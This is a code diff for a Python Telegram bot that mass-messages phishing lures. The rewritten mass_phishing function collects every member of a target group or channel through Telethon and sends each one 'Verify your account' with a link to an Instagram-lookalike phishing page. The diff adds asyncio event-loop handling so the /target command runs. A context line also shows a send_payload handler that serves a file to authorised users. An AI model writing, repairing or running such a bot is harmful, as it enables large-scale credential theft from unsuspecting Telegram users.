@@ -2,6 +2,7 @@ import os
 import telebot
 from telethon import TelegramClient
 import threading 
+import asyncio
 
 # Load environment variables
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
@@ -99,29 +100,7 @@ def send_payload(message):
     else:
         bot.reply_to(message, "⚠️ You are not authorized to request this file.")
 
-# Mass Phishing Function
-async def mass_phishing(target_name):
-    async with client:
-        try:
-            # Get target entity (group, channel, or user)
-            target = await client.get_entity(target_name)
-
-            # Fetch participants
-            participants = await client.get_participants(target)
-
-            for user in participants:
-                try:
-                    # Send phishing message
-                    await client.send_message(user, "🚨 Important: Verify your account:\nhttps://instag-pwk3.onrender.com")
-                    print(f"Message sent to {user.id}")
-                except telethon.errors.UserPrivacyRestrictedError:
-                    print(f"Cannot message user {user.id} due to privacy settings.")
-                except Exception as e:
-                    print(f"Failed to message user {user.id}: {e}")
-        except Exception as e:
-            print(f"Error during mass phishing: {e}")
-
-# Mass Phishing Command Handler
+# 4. Mass Messaging with Telethon
 @bot.message_handler(commands=['target'])
 def set_target(message):
     bot.reply_to(message, "📌 Please enter the name of the target group or username:")
@@ -130,12 +109,33 @@ def set_target(message):
 def mass_phishing_start(message):
     target_name = message.text.strip()
     bot.reply_to(message, f"🔍 Starting phishing for: {target_name}. Please wait...")
+
+    # Create and set an event loop for this thread
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+
     try:
-        client.loop.run_until_complete(mass_phishing(target_name))
+        # Run the async function in the created loop
+        loop.run_until_complete(mass_phishing(target_name))
         bot.reply_to(message, f"✅ Phishing messages sent to: {target_name}.")
     except Exception as e:
         bot.reply_to(message, f"❌ An error occurred: {e}")
+    finally:
+        # Close the loop to clean up
+        loop.close()
 
+async def mass_phishing(target_name):
+    async with client:
+        try:
+            # Fetch participants for a group or a single user
+            participants = await client.get_participants(target_name)
+            for user in participants:
+                try:
+                    await client.send_message(user, "🚨 Important: Verify your account:\nhttps://instag-pwk3.onrender.com")
+                except Exception as e:
+                    print(f"Failed to message user {user.id}: {e}")
+        except Exception as e:
+            print(f"Error fetching target participants: {e}")
 # 7. Log Responses
 @bot.message_handler(func=lambda msg: True)
 def log_responses(message):
